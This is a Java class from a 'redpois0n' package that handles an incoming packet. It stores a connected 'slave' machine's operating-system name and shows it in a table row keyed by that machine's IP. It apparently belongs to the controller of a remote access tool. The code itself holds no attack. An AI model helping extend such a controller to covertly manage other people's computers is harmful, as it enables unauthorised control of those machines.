package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.Frame;
import com.redpois0n.utils.Util;

public class Packet16InitOperatingSystem extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setOperatingSystem(slave.readLine());
		Frame.mainModel.setValueAt(slave.getOperatingSystem(), Util.getRow(3, slave.getIP()), 6);
	}

}
